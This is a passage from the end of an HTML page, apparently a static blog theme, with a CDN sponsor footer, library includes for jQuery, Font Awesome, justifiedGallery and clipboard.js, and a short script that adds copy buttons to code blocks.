      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
        <img class="img-response" src="/images/upyun.png" alt="cdn image">
      </a>
    
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">


<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>


<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

</body>
</html>
